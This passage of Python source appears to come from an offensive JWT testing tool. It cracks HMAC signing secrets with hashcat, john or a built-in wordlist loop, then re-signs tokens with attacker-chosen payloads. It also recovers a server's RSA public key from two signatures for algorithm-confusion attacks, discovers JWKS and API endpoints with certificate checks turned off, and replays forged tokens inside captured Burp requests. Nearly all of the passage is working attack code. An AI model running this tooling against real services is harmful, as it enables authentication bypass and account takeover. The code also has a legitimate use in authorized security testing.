    potfile = hashfile + ".pot"
    cmd = ["hashcat", "-m", str(mode), "-a", "0", hashfile, wordlist,
           "--potfile-path", potfile, "--quiet"]
    if rules:
        cmd += ["-r", rules]
    try:
        subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        # recover the plaintext
        show = subprocess.run(
            ["hashcat", "-m", str(mode), hashfile, "--show",
             "--potfile-path", potfile, "--quiet"],
            capture_output=True, text=True, timeout=60,
        )
        out = show.stdout.strip()
        if out and ":" in out:
            # format is <jwt>:<secret>
            return out.rsplit(":", 1)[1]
    except subprocess.TimeoutExpired:
        warn("hashcat timed out")
    finally:
        for p in (hashfile, potfile):
            try:
                os.unlink(p)
            except OSError:
                pass
    return None


def _crack_john(jwt, wordlist):
    info("running john (HMAC-SHA256) against the token ...")
    with tempfile.NamedTemporaryFile("w", suffix=".jwt", delete=False) as f:
        f.write(jwt.raw)
        hashfile = f.name
    try:
        subprocess.run(
            ["john", f"--format=HMAC-SHA256", f"--wordlist={wordlist}", hashfile],
            capture_output=True, text=True, timeout=3600,
        )
        show = subprocess.run(
            ["john", "--show", f"--format=HMAC-SHA256", hashfile],
            capture_output=True, text=True, timeout=60,
        )
        for line in show.stdout.splitlines():
            if ":" in line and not line.startswith("0 password"):
                parts = line.split(":")
                if len(parts) >= 2 and parts[1]:
                    return parts[1]
    except subprocess.TimeoutExpired:
        warn("john timed out")
    finally:
        try:
            os.unlink(hashfile)
        except OSError:
            pass
    return None


def _crack_builtin(jwt, wordlist, alg):
    info("no external cracker used — running built-in HMAC brute ...")
    hfunc = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
             "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    target = jwt.signature
    signing_input = jwt.signing_input.encode()
    count = 0
    with open(wordlist, "rb") as f:
        for line in f:
            secret = line.rstrip(b"\r\n")
            count += 1
            if count % 500000 == 0:
                info(f"  tried {count:,} ...")
            cand = hmac.new(secret, signing_input, hfunc).digest()
            if hmac.compare_digest(cand, target):
                return secret.decode(errors="replace")
    info(f"  tried {count:,} candidates total")
    return None


def resign_hs256(jwt, new_payload, secret, alg="HS256"):
    hfunc = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
             "HS512": hashlib.sha512}.get(alg, hashlib.sha256)
    header = {"alg": alg, "typ": "JWT"}
    # preserve kid if present (needed when server routes keys by kid)
    if "kid" in jwt.header:
        header["kid"] = jwt.header["kid"]
    signing_input = f"{encode_segment(header)}.{encode_segment(new_payload)}"
    sig = hmac.new(secret.encode(), signing_input.encode(), hfunc).digest()
    return f"{signing_input}.{b64url_encode(sig)}"


# ── JWKS auto-discovery ──────────────────────────────────────────────────────
JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json", "/jwks",
    "/api/jwks", "/api/jwks.json",
    "/api/auth/jwks", "/api/auth/.well-known/jwks.json",
    "/oauth/jwks", "/oauth2/jwks",
    "/.well-known/keys", "/keys", "/api/keys",
    "/auth/realms/master/protocol/openid-connect/certs",  # Keycloak
]


def discover_jwks(base_url, prefer_use=None):
    """Probe common JWKS endpoints. Returns (pem, kid, source_url) or
    (None, None, None). `kid` is the chosen key's id (for echoing into a JWE);
    `prefer_use` picks a key whose "use" matches (e.g. "enc") when several exist."""
    if not HAS_REQUESTS:
        warn("requests not installed — cannot auto-discover JWKS")
        return None, None, None
    base = base_url.rstrip("/")
    # derive scheme://host from a full URL
    m = re.match(r"(https?://[^/]+)", base)
    origin = m.group(1) if m else base
    for path in JWKS_PATHS:
        url = origin + path
        try:
            r = requests.get(url, timeout=6, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            # openid-configuration points to jwks_uri
            if "jwks_uri" in data:
                jr = requests.get(data["jwks_uri"], timeout=6, verify=False)
                data = jr.json()
                url = data.get("jwks_uri", url)
            pem, kid = jwks_to_pem_and_kid(data, prefer_use=prefer_use)
            if pem:
                return pem, kid, url
        except Exception:
            continue
    return None, None, None


def fetch_jwks_url(url, prefer_use=None):
    """Fetch a JWKS from an exact URL (--jwks-url). Returns (pem, kid)."""
    if not HAS_REQUESTS:
        warn("requests not installed — cannot fetch JWKS")
        return None, None
    try:
        data = requests.get(url, timeout=6, verify=False).json()
        if "jwks_uri" in data:        # an openid-configuration doc
            data = requests.get(data["jwks_uri"], timeout=6, verify=False).json()
        return jwks_to_pem_and_kid(data, prefer_use=prefer_use)
    except Exception as e:
        warn(f"could not fetch JWKS from {url}: {e}")
        return None, None


def jwks_to_pem_and_kid(jwks, prefer_use=None):
    """Return (pem, kid) for an RSA key in a JWKS document. When `prefer_use` is
    given (e.g. "enc"), a key with that "use" (or a kid hinting it) is chosen first;
    otherwise the first RSA key."""
    if not HAS_CRYPTO:
        return None, None
    rsa_keys = [k for k in jwks.get("keys", []) if k.get("kty") == "RSA"]
    chosen = None
    if prefer_use:
        for k in rsa_keys:
            if k.get("use") == prefer_use or prefer_use in str(k.get("kid", "")).lower():
                chosen = k
                break
    for k in ([chosen] if chosen else []) + rsa_keys:
        if k is None:
            continue
        try:
            n = int.from_bytes(b64url_decode(k["n"]), "big")
            e = int.from_bytes(b64url_decode(k["e"]), "big")
            pub = rsa.RSAPublicNumbers(e, n).public_key()
            pem = pub.public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            return pem.decode(), k.get("kid")
        except Exception:
            continue
    return None, None


def jwks_to_pem(jwks):
    """Convert the first RSA key in a JWKS document to a PEM public key (compat)."""
    return jwks_to_pem_and_kid(jwks)[0]


# ── RSA public-key recovery from two signatures (GCD attack) ─────────────────
# When no public key is available (no --pubkey, JWKS discovery failed) we can
# still run RS256→HS256 confusion if we have TWO tokens signed by the same key:
# for an RSA signature sig^e ≡ m (mod n), where m is the PKCS#1 v1.5 EMSA-padded
# hash. Both (sig0^e - m0) and (sig1^e - m1) are multiples of n, so their GCD is
# n (times a small factor we divide out). Hand-rolled EMSA padding + DER/PEM
# encoder; builtin pow for the (cheap, modular) verification.
#
# NOTE: e=3 is instant at any key size. e=65537 means raising to the 65537th
# power and GCD-ing multi-megabit integers. That single UNMODULATED power is the
# whole cost — and it can't be a modular pow (n is unknown; deriving it is the
# point). gmpy2 (optional accelerator) runs that arithmetic under GMP: ~27s for a
# 2048-bit key vs ~hours in pure Python. Without gmpy2 we warn up front and lean
# on --derive-timeout so a demo never hangs.

# DER DigestInfo prefixes for the PKCS#1 v1.5 EMSA (hardcoded, per RFC 8017).
_DIGESTINFO = {
    "SHA256": bytes.fromhex("3031300d060960864801650304020105000420"),
    "SHA384": bytes.fromhex("3041300d060960864801650304020205000430"),
    "SHA512": bytes.fromhex("3051300d060960864801650304020305000440"),
}
_RS_HASH = {"RS256": "SHA256", "RS384": "SHA384", "RS512": "SHA512"}
_HASHERS = {"SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512}

# AlgorithmIdentifier for rsaEncryption: SEQ { OID 1.2.840.113549.1.1.1, NULL }
_RSA_ALG_ID = bytes.fromhex("300d06092a864886f70d0101010500")


def _emsa_pkcs1v15_int(signing_input_bytes, hname, emlen):
    """The PKCS#1 v1.5 EMSA-encoded message m as an integer, length emlen bytes:
    0x00 01 FF..FF 00 || DigestInfo || H(signing_input)."""
    h = _HASHERS[hname](signing_input_bytes).digest()
    t = _DIGESTINFO[hname] + h
    if emlen < len(t) + 11:
        raise ValueError("modulus too small (%d bytes) for %s PKCS#1 padding"
                         % (emlen, hname))
    ps = b"\xff" * (emlen - len(t) - 3)
    em = b"\x00\x01" + ps + b"\x00" + t
    return int.from_bytes(em, "big")


# -- minimal DER encoder --
def _der_len(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_uint(x):
    b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
    if b[0] & 0x80:            # keep it positive — prepend a leading zero
        b = b"\x00" + b
    return b"\x02" + _der_len(len(b)) + b


def _der_seq(*items):
    body = b"".join(items)
    return b"\x30" + _der_len(len(body)) + body


def _der_bitstring(data):
    return b"\x03" + _der_len(len(data) + 1) + b"\x00" + data


def _pem(der, label):
    b64 = base64.b64encode(der).decode()
    body = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (label, body, label)


def rsa_public_pems(n, e):
    """Return (pkcs1_pem, spki_pem) for the public key (n, e)."""
    pkcs1_der = _der_seq(_der_uint(n), _der_uint(e))
    spki_der = _der_seq(_RSA_ALG_ID, _der_bitstring(pkcs1_der))
    return _pem(pkcs1_der, "RSA PUBLIC KEY"), _pem(spki_der, "PUBLIC KEY")


def recover_modulus(sig0, m0, sig1, m1, exponents=(3, 65537), progress=None):
    """GCD-of-signatures: recover (n, e) from two (sig, m) integer pairs.

    Returns a list of verified (n, e). e=3 is tried first (cheap), then e=65537.
    When gmpy2 is importable, the costly unmodulated power + subtraction + GCD run
    under GMP; otherwise math.gcd (slow for large e=65537 keys). ``progress`` is an
    optional callable(str) fed step-by-step status so the caller can show it's not
    hung.
    """
    def say(msg):
        if progress:
            progress(msg)

    # Accelerate the one expensive step (sig**e, the subtraction, the GCD) with
    # gmpy2 when present. Everything else is plain-int and cheap.
    if _GMPY2 is not None:
        mpz, gcd = _GMPY2.mpz, _GMPY2.gcd
        a0, b0, a1, b1 = mpz(sig0), mpz(m0), mpz(sig1), mpz(m1)
        engine = "gmpy2"
    else:
        gcd = math.gcd
        a0, b0, a1, b1 = sig0, m0, sig1, m1
        engine = "pure-python"

    found, seen = [], set()
    for e in exponents:
        say("e=%d: computing gcd(sig0^e - m0, sig1^e - m1) via %s%s …"
            % (e, engine, "  (the slow unmodulated power)" if e > 3 else ""))
        g = int(gcd(a0 ** e - b0, a1 ** e - b1))
        if g <= 1:
            say("e=%d: gcd too small — not this exponent" % e)
            continue
        say("e=%d: gcd is %d bits; testing small multipliers 1..99 …"
            % (e, g.bit_length()))
        # g == c * n for a small spurious factor c = gcd(k0, k1). Divide it out:
        # a divisor smaller than n cannot verify (it would be <= m, so the residue
        # wouldn't match), so the SMALLEST verifying candidate is the true modulus.
        best = None
        for mult in range(1, 100):
            if g % mult:
                continue
            n = g // mult
            if n <= sig0 or n <= sig1 or n <= m0 or n <= m1:
                continue
            if pow(sig0, e, n) == m0 and pow(sig1, e, n) == m1:
                if best is None or n < best:
                    best = n
        if best is not None:
            say("e=%d: recovered and verified a %d-bit modulus ✓"
                % (e, best.bit_length()))
            if best not in seen:
                seen.add(best)
                found.append((best, e))
            # a key has exactly one exponent — once it verifies, don't raise to
            # the *other* exponent (65537 on a big key is very expensive)
            break
        say("e=%d: no multiplier yielded a verifying modulus" % e)
    return found


def _recover_child(sig0, m0, sig1, m1, exponents, conn):
    """Child-process entry point for recover_modulus_timed: run the recovery,
    streaming progress to the inherited stdout, and ship the result back."""
    try:
        res = recover_modulus(sig0, m0, sig1, m1, exponents,
                              progress=lambda s: print("    " + s, flush=True))
        conn.send(("ok", res))
    except BaseException as exc:                 # report, never hang the parent
        conn.send(("err", str(exc)))
    finally:
        conn.close()


def recover_modulus_timed(sig0, m0, sig1, m1, exponents=(3, 65537),
                          timeout=None, progress=None):
    """recover_modulus, but abort after ``timeout`` seconds.

    A single big-int power is one atomic C call — a SIGALRM/thread can't interrupt
    it mid-flight — so when a timeout is set we run the recovery in a child process
    and kill it if it overruns. timeout None/<=0 runs in-process (no limit). Raises
    TimeoutError when the budget is exceeded.
    """
    if not timeout or timeout <= 0:
        return recover_modulus(sig0, m0, sig1, m1, exponents, progress=progress)

    import multiprocessing as mp
    # Prefer a fork context: the child inherits our already-imported gmpy2 and
    # doesn't re-execute the module (so the single-file form works too). Fall back
    # to the platform default where fork is unavailable (e.g. Windows).
    try:
        ctx = mp.get_context("fork")
    except ValueError:
        ctx = mp.get_context()
    conn_r, conn_w = ctx.Pipe(False)
    proc = ctx.Process(target=_recover_child,
                       args=(sig0, m0, sig1, m1, exponents, conn_w))
    proc.daemon = True
    proc.start()
    conn_w.close()
    try:
        proc.join(timeout)
    except KeyboardInterrupt:                    # Ctrl-C: kill the child, re-raise
        proc.terminate()
        proc.join()
        raise
    if proc.is_alive():
        proc.terminate()
        proc.join()
        raise TimeoutError(
            "key derivation exceeded %ss — install gmpy2 for a fast path, or raise "
            "--derive-timeout" % timeout)
    try:
        status, payload = conn_r.recv()
    except EOFError:                             # child died without sending
        return []
    if status == "err":
        raise ValueError(payload)
    return payload


def derive_public_key(token0, token1, exponents=(3, 65537), timeout=None,
                      progress=None):
    """Recover the server's RSA public key from two JWTs signed by the same key.

    Returns a list of dicts {n, e, pkcs1_pem, spki_pem}. Raises ValueError with a
    clear message on bad input (non-RS alg, mismatched alg/sig length, no sig), or
    TimeoutError if the GCD step exceeds ``timeout`` seconds. ``progress`` is an
    optional callable(str) for step-by-step status.
    """
    j0, j1 = JWT(token0), JWT(token1)
    a0 = j0.header.get("alg", "").upper()
    a1 = j1.header.get("alg", "").upper()
    if a0 not in _RS_HASH or a1 not in _RS_HASH:
        raise ValueError("both tokens must be RS256/RS384/RS512 "
                         "(got alg=%s and alg=%s)" % (a0 or "?", a1 or "?"))
    if a0 != a1:
        raise ValueError("tokens use different algorithms (%s vs %s) — "
                         "need two tokens from the same key" % (a0, a1))
    s0, s1 = j0.signature, j1.signature
    if not s0 or not s1:
        raise ValueError("a token has no signature to work from")
    if len(s0) != len(s1):
        raise ValueError("signature lengths differ (%d vs %d bytes) — the tokens "
                         "are not from the same RSA key" % (len(s0), len(s1)))
    hname = _RS_HASH[a0]
    emlen = len(s0)
    m0 = _emsa_pkcs1v15_int(j0.signing_input.encode(), hname, emlen)
    m1 = _emsa_pkcs1v15_int(j1.signing_input.encode(), hname, emlen)
    sig0 = int.from_bytes(s0, "big")
    sig1 = int.from_bytes(s1, "big")
    out = []
    for n, e in recover_modulus_timed(sig0, m0, sig1, m1, exponents=exponents,
                                      timeout=timeout, progress=progress):
        pkcs1_pem, spki_pem = rsa_public_pems(n, e)
        out.append({"n": n, "e": e, "pkcs1_pem": pkcs1_pem, "spki_pem": spki_pem})
    return out


def run_key_recovery(args, jwt):
    """Derive the public key from the primary token + --derive-key, print it, and
    return the recovered key list (empty on failure). Reuses the same pubkey the
    existing confusion attack consumes."""
    hdr("Key Recovery — deriving n from two signatures")
    _PRES.narrate("recover the RSA public key from two tokens signed by the same key")
    timeout = getattr(args, "derive_timeout", 120)
    if _GMPY2 is not None:
        info("trying e=3 then e=65537 (gmpy2 %s accelerator active) …"
             % _GMPY2.version())
    else:
        info("trying e=3 then e=65537 …")
        warn("e=65537 key derivation is very slow without gmpy2 (minutes+). "
             "Install with: pip install gmpy2")
    if timeout and timeout > 0:
        info("derivation timeout: %ss (override with --derive-timeout; 0 = no limit)"
             % timeout)
    try:
        results = derive_public_key(jwt.raw, args.derive_key, timeout=timeout,
                                    progress=info)
    except TimeoutError as e:
        fail(str(e))
        _PRES.verdict(False, "timed out", ok_label="✓ KEY RECOVERED",
                      fail_label="✗ KEY NOT RECOVERED")
        return []
    except ValueError as e:
        fail(str(e))
        _PRES.verdict(False, str(e), ok_label="✓ KEY RECOVERED",
                      fail_label="✗ KEY NOT RECOVERED")
        return []
    if not results:
        skip("no modulus recovered — tokens may use different keys, or e∉{3,65537}")
        _PRES.verdict(False, "no modulus recovered", ok_label="✓ KEY RECOVERED",
                      fail_label="✗ KEY NOT RECOVERED")
        return []
    for r in results:
        ok("recovered RSA public key: e=%d, n=%d bits" % (r["e"], r["n"].bit_length()))
        print(f"{C.DIM}  PKCS#1:{C.R}")
        for line in r["pkcs1_pem"].strip().splitlines():
            print(f"    {line}")
        print(f"{C.DIM}  SPKI:{C.R}")
        for line in r["spki_pem"].strip().splitlines():
            print(f"    {line}")
    _PRES.verdict(True, "%d-bit modulus recovered (e=%d)"
                  % (results[0]["n"].bit_length(), results[0]["e"]),
                  ok_label="✓ KEY RECOVERED", fail_label="✗ KEY NOT RECOVERED")
    return results


# ── Passive endpoint discovery ───────────────────────────────────────────────
# Find endpoints the app already advertises — in its own pages, JS bundles and
# API-spec documents — and feed them straight into the scan engine. This is
# PASSIVE only: no wordlists, no path brute-forcing, no guessing routes that
# aren't referenced somewhere. Same-origin is enforced; destructive-looking
# routes are excluded from the auto-scan unless explicitly included.
API_SPEC_PATHS = [
    "/swagger.json", "/openapi.json", "/v2/api-docs", "/v3/api-docs",
    "/api-docs", "/swagger/v1/swagger.json", "/.well-known/openapi.json",
]

_STATIC_ASSET_RE = re.compile(
    r"\.(?:js|mjs|cjs|css|map|png|jpe?g|gif|svg|webp|avif|ico|bmp|"
    r"woff2?|ttf|otf|eot|mp4|webm|mp3|pdf)(?:[?#]|$)", re.I)

_DESTRUCTIVE_RE = re.compile(r"delete|remove|drop|reset|revoke|logout|signout", re.I)
_DESTRUCTIVE_METHODS = {"DELETE"}

_SCRIPT_SRC_RE = re.compile(r"<script[^>]+\bsrc\s*=\s*[\"']([^\"']+)[\"']", re.I)
_SCRIPT_BLOCK_RE = re.compile(
    r"<script(?![^>]*\bsrc\s*=)[^>]*>(.*?)</script>", re.I | re.S)

# endpoint references inside JS source (fetch / axios / jQuery.ajax)
_JS_CALL_RES = [
    re.compile(r"""fetch\(\s*[`"']([^`"']+)[`"']""", re.I),
    re.compile(r"""axios\s*\.\s*(?:get|post|put|delete|patch|head|options)"""
               r"""\(\s*[`"']([^`"']+)[`"']""", re.I),
    re.compile(r"""\$\.ajax\(\s*\{[^}]*?\burl\s*:\s*[`"']([^`"']+)[`"']""",
               re.I | re.S),
]
# XMLHttpRequest .open(METHOD, URL) — capture both so a DELETE can be flagged
_XHR_OPEN_RE = re.compile(
    r"""\.open\(\s*[`"']([A-Za-z]+)[`"']\s*,\s*[`"']([^`"']+)[`"']""")
# bare path literals ('$' kept in the class so `/x/${id}` is captured whole)
_BARE_PATH_RES = [
    re.compile(r"/api/[\w/\-{}:.$]+"),
    re.compile(r"/v\d+/[\w/\-{}:.$]+"),
]
_ABS_URL_RE = re.compile(r"""https?://[^\s"'`)<>\]]+""")

# path-segment placeholders -> substituted with a safe test value
_PLACEHOLDER_SEG_RES = [
    re.compile(r"^\$\{[^}]*\}$"),    # ${id}
    re.compile(r"^\{[^}]*\}$"),      # {id}
    re.compile(r"^<[^>]*>$"),        # <id>
    re.compile(r"^:[A-Za-z_]\w*$"),  # :id
]
_PLACEHOLDER_VALUE = "1"


def _origin_of(url):
    p = urlparse(url)
    return "%s://%s" % (p.scheme, p.netloc), p


def _substitute_placeholders(path):
    """Collapse :id / {id} / ${id} / <id> segments to a safe value.

    Returns (new_path, templated?).
    """
    templated = False
    out = []
    for seg in path.split("/"):
        if seg and any(r.match(seg) for r in _PLACEHOLDER_SEG_RES):
            out.append(_PLACEHOLDER_VALUE)
            templated = True
        else:
            out.append(seg)
    return "/".join(out), templated


class Surface:
    """The passively-discovered attack surface at one origin.

    Buckets endpoints into: scan_plain / scan_templated (both get scanned),
    destructive (skipped unless overridden) and external (never scanned).
    """
    def __init__(self, origin):
        self.origin = (origin or "").rstrip("/")
        self._origin_netloc = urlparse(self.origin).netloc
        self.scan_plain = []
        self.scan_templated = []
        self.destructive = []        # list of (url, reason)
        self.external = []
        self._seen = set()           # urls already classified as scan/destructive
        self._seen_ext = set()

    def _add_scan(self, url, templated):
        if url in self._seen:
            return
        self._seen.add(url)
        (self.scan_templated if templated else self.scan_plain).append(url)

    def _add_dest(self, url, reason):
        if url in self._seen:
            return
        self._seen.add(url)
        self.destructive.append((url, reason))

    def add_external(self, url):
        if url not in self._seen_ext:
            self._seen_ext.add(url)
            self.external.append(url)

    def add_candidate(self, raw, method=None):
        """Normalise, same-origin-filter, placeholder-collapse and safety-class
        a single raw URL/path reference."""
        if not raw:
            return
        raw = raw.strip()
        if not raw:
            return
        abs_url = urljoin(self.origin + "/", raw)
        p = urlparse(abs_url)
        if p.scheme not in ("http", "https"):
            return
        if p.netloc != self._origin_netloc:   # same-origin enforcement
            self.add_external(abs_url)
            return
        path = p.path or "/"
        if _STATIC_ASSET_RE.search(path):      # drop static assets
            return
        norm_path, templated = _substitute_placeholders(path)
        norm_path = norm_path.rstrip("/") or "/"
        if norm_path == "/":
            return
        norm_url = self.origin + norm_path
        reason = None
        if method and method.upper() in _DESTRUCTIVE_METHODS:
            reason = "method %s" % method.upper()
        else:
            m = _DESTRUCTIVE_RE.search(norm_path)
            if m:
                reason = "path contains '%s'" % m.group(0).lower()
        if reason:
            self._add_dest(norm_url, reason)
        else:
            self._add_scan(norm_url, templated)

    def merge(self, other):
        for u in other.scan_plain:
            self._add_scan(u, False)
        for u in other.scan_templated:
            self._add_scan(u, True)
        for u, reason in other.destructive:
            self._add_dest(u, reason)
        for u in other.external:
            self.add_external(u)
        return self

    def scan_targets(self, include_destructive=False):
        urls = list(self.scan_plain) + list(self.scan_templated)
        if include_destructive:
            urls += [u for u, _ in self.destructive]
        return urls


def surface_scan_targets(surface, include_destructive=False):
    return surface.scan_targets(include_destructive=include_destructive)


def _scan_js_source(text, surface):
    for pat in _JS_CALL_RES:
        for m in pat.findall(text):
            surface.add_candidate(m)
    for method, url in _XHR_OPEN_RE.findall(text):
        surface.add_candidate(url, method=method)
    for pat in _BARE_PATH_RES:
        for m in pat.findall(text):
            surface.add_candidate(m)
    for m in _ABS_URL_RE.findall(text):
        surface.add_candidate(m)


def _extract_json_links(obj, acc=None):
    """HAL / JSON:API style — pull href / url / _links from any JSON seen."""
    if acc is None:
        acc = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in ("href", "url") and isinstance(v, str):
                acc.append(v)
            elif k == "_links" and isinstance(v, dict):
                for lv in v.values():
                    if isinstance(lv, dict) and isinstance(lv.get("href"), str):
                        acc.append(lv["href"])
                    elif isinstance(lv, str):
                        acc.append(lv)
            else:
                _extract_json_links(v, acc)
    elif isinstance(obj, list):
        for it in obj:
            _extract_json_links(it, acc)
    return acc


def _scan_openapi(doc, surface):
    paths = doc.get("paths") if isinstance(doc, dict) else None
    if not isinstance(paths, dict):
        return
    http_methods = ("get", "post", "put", "delete", "patch", "head", "options")
    for path, item in paths.items():
        if not isinstance(path, str):
            continue
        methods = [m for m in item if isinstance(m, str) and m.lower() in http_methods] \
            if isinstance(item, dict) else []
        if methods:
            for m in methods:
                surface.add_candidate(path, method=m)
        else:
            surface.add_candidate(path)


def _disc_fetch(url, timeout=6):
    try:
        return requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def discover_endpoints(base_url, timeout=6):
    """Passively discover same-origin endpoints at base_url. Returns a Surface."""
    origin, _ = _origin_of(base_url)
    surface = Surface(origin)
    if not HAS_REQUESTS:
        warn("requests not installed — cannot run discovery")
        return surface

    seen_json = []

    # 1. the base page: inline scripts + same-origin <script src> bundles
    r = _disc_fetch(base_url, timeout)
    if r is not None and getattr(r, "text", ""):
        html = r.text
        for block in _SCRIPT_BLOCK_RE.findall(html):
            _scan_js_source(block, surface)
        for src in _SCRIPT_SRC_RE.findall(html):
            abs_src = urljoin(base_url, src)
            if urlparse(abs_src).netloc != surface._origin_netloc:
                surface.add_external(abs_src)
                continue
            jr = _disc_fetch(abs_src, timeout)
            if jr is not None and getattr(jr, "text", ""):
                _scan_js_source(jr.text, surface)

    # 2. common API-spec documents (swagger / openapi) — every path+method
    for path in API_SPEC_PATHS:
        sr = _disc_fetch(origin + path, timeout)
        if sr is None or sr.status_code != 200:
            continue
        try:
            doc = sr.json()
        except Exception:
            continue
        seen_json.append(doc)
        _scan_openapi(doc, surface)

    # 3. HAL / JSON:API links in any JSON already seen
    for doc in seen_json:
        for href in _extract_json_links(doc):
            surface.add_candidate(href)

    return surface


def import_endpoints(path, base_url):
    """Ingest an endpoint list (one URL/path per line, '#' comments ignored) at
    base_url's origin, applying the same normalise/filter/safety pipeline."""
    origin, _ = _origin_of(base_url)
    surface = Surface(origin)
    for line in Path(path).read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        surface.add_candidate(line)
    return surface


def _infer_origin_from_file(path):
    try:
        for line in Path(path).read_text().splitlines():
            line = line.strip()
            if line.startswith(("http://", "https://")):
                o, _ = _origin_of(line)
                return o
    except Exception:
        pass
    return None


def gather_surface(args):
    """Build the merged discovery + import surface from the CLI args."""
    base = args.discover or args.url
    origin = None
    if base:
        origin, _ = _origin_of(base)
    elif args.import_file:
        origin = _infer_origin_from_file(args.import_file)
    if not origin:
        fail("discovery/import needs an origin — pass --discover <url> or --url <url>")
        return None
    surface = Surface(origin)
    if args.discover:
        surface.merge(discover_endpoints(args.discover))
    if args.import_file:
        surface.merge(import_endpoints(args.import_file, origin))
    return surface


def print_surface(surface, include_destructive=False):
    hdr("Passive Endpoint Discovery")
    info("origin: %s" % surface.origin)

    def _list(items, render):
        for it in items:
            print("      %s" % render(it))

    ok("[will scan] %d endpoint(s)" % len(surface.scan_plain))
    _list(surface.scan_plain, lambda u: u)

    if surface.scan_templated:
        info("[templated, value substituted] %d" % len(surface.scan_templated))
        _list(surface.scan_templated,
              lambda u: "%s   (templated — value substituted)" % u)

    if surface.destructive:
        tag = "INCLUDED (--include-destructive)" if include_destructive else "SKIPPED by default"
        warn("[skipped: potentially destructive] %d  — %s"
             % (len(surface.destructive), tag))
        _list(surface.destructive, lambda ur: "%s   (%s)" % (ur[0], ur[1]))

    if surface.external:
        skip("[external references, not scanned] %d" % len(surface.external))
        _list(surface.external, lambda u: u)

    if not (surface.scan_plain or surface.scan_templated
            or surface.destructive or surface.external):
        warn("nothing discovered")


def _confirm(prompt):
    try:
        ans = input("  %s[?]%s %s [y/N] " % (C.YEL, C.R, prompt)).strip().lower()
    except EOFError:
        return False
    return ans in ("y", "yes")


# ── Burp / raw HTTP request parsing ──────────────────────────────────────────
# A JWT in a request lives in exactly one of three places. We find it, remember
# where, and swap it there when replaying.
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


class HTTPRequest:
    """A parsed raw HTTP request (Burp 'Copy to file' / 'Save item' format).

    Knows where the JWT is (header / cookie / body) so it can be swapped for a
    forged one and the whole request replayed byte-for-byte otherwise.
    """
    def __init__(self, raw, force_https=None):
        self.raw = raw
        self.method = "GET"
        self.path = "/"
        self.version = "HTTP/1.1"
        self.headers = []          # list of (name, value) preserving order+dupes
        self.body = ""
        self.host = None
        self.scheme = "https"
        # where the token was found: ("header", idx) | ("cookie", cookie_name) | ("body", None)
        self.token_location = None
        self.token_value = None
        self._parse(raw)
        if force_https is True:
            self.scheme = "https"
        elif force_https is False:
            self.scheme = "http"

    def _parse(self, raw):
        # normalise line endings, split headers from body on the blank line
        raw = raw.replace("\r\n", "\n")
        if "\n\n" in raw:
            head, self.body = raw.split("\n\n", 1)
        else:
            head, self.body = raw, ""
        lines = head.split("\n")
        if not lines:
            raise ValueError("empty request")
        # request line
        req_line = lines[0].strip()
        parts = req_line.split()
        if len(parts) >= 2:
            self.method = parts[0].upper()
            self.path = parts[1]
            if len(parts) >= 3:
                self.version = parts[2]
        else:
            raise ValueError(f"malformed request line: {req_line!r}")
        # headers
        for line in lines[1:]:
            if not line.strip():
                continue
            if ":" not in line:
                continue
            name, value = line.split(":", 1)
            name, value = name.strip(), value.strip()
            self.headers.append((name, value))
            if name.lower() == "host":
                self.host = value
        self._locate_token()

    def _locate_token(self):
        # 1. Any non-Cookie header containing a JWT (Authorization, X-Access-Token, …).
        #    Cookie is handled separately so sibling cookies are preserved on swap.
        for idx, (name, value) in enumerate(self.headers):
            if name.lower() == "cookie":
                continue
            m = JWT_RE.search(value)
            if m:
                self.token_location = ("header", idx)
                self.token_value = m.group(0)
                return
        # 2. Cookie header — find which cookie holds the JWT
        for idx, (name, value) in enumerate(self.headers):
            if name.lower() == "cookie":
                for cookie in value.split(";"):
                    if "=" not in cookie:
                        continue
                    ck, cv = cookie.split("=", 1)
                    m = JWT_RE.search(cv)
                    if m:
                        self.token_location = ("cookie", ck.strip())
                        self.token_value = m.group(0)
                        return
        # 3. Body
        m = JWT_RE.search(self.body)
        if m:
            self.token_location = ("body", None)
            self.token_value = m.group(0)
            return

    @property
    def url(self):
        host = self.host or "localhost"
        return f"{self.scheme}://{host}{self.path}"

    def with_token(self, new_token):
        """Return (headers_dict, body, cookies_dict) for replaying with new_token swapped in."""
        headers = {}
        cookies = {}
        loc_kind = self.token_location[0] if self.token_location else None

        for idx, (name, value) in enumerate(self.headers):
            lname = name.lower()
            if lname == "host":
                continue  # requests sets Host from the URL
            if lname in ("content-length",):
                continue  # requests recomputes
            if lname == "cookie":
                # rebuild the cookie header, swapping the target cookie's value
                for cookie in value.split(";"):
                    if "=" not in cookie:
                        continue
                    ck, cv = cookie.split("=", 1)
                    ck, cv = ck.strip(), cv.strip()
                    if loc_kind == "cookie" and ck == self.token_location[1]:
                        cookies[ck] = new_token
                    else:
                        cookies[ck] = cv
                continue
            # header that holds the token → swap the token substring
            if loc_kind == "header" and idx == self.token_location[1]:
                headers[name] = JWT_RE.sub(new_token, value)
            else:
                headers[name] = value

        body = self.body
        if loc_kind == "body":
            body = JWT_RE.sub(new_token, body)

        return headers, body, cookies


def parse_request_file(path, force_https=None):
    raw = Path(path).read_text(errors="replace")
    return HTTPRequest(raw, force_https=force_https)


# ── Endpoint replay ──────────────────────────────────────────────────────────
def replay(url, token, method="GET", header_name="Authorization",
           header_fmt="Bearer {token}", cookie_name=None, baseline_token=None,
           extra_headers=None):
    """Send the forged token to a plain URL, return (status, length, snippet)."""
    if not HAS_REQUESTS:
        return None
    headers = dict(extra_headers or {})
    cookies = {}
    if cookie_name:
